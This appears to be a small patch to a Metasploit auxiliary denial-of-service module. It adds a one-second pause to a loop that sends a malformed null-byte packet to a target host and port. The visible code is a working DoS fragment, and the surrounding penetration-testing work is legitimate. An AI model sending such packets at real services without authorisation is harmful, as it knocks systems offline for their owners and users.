@@ -55,6 +55,7 @@ class Metasploit3 < Msf::Auxiliary
 				print_status("Sending DoS packet to #{rhost}:#{rport}")
 				sock.put("\x00 / \r\n\r\n")
 				disconnect
+				sleep 1
 			rescue ::Rex::ConnectionRefused
 				print_status("Unable to connect to #{rhost}:#{rport}.")
 				break
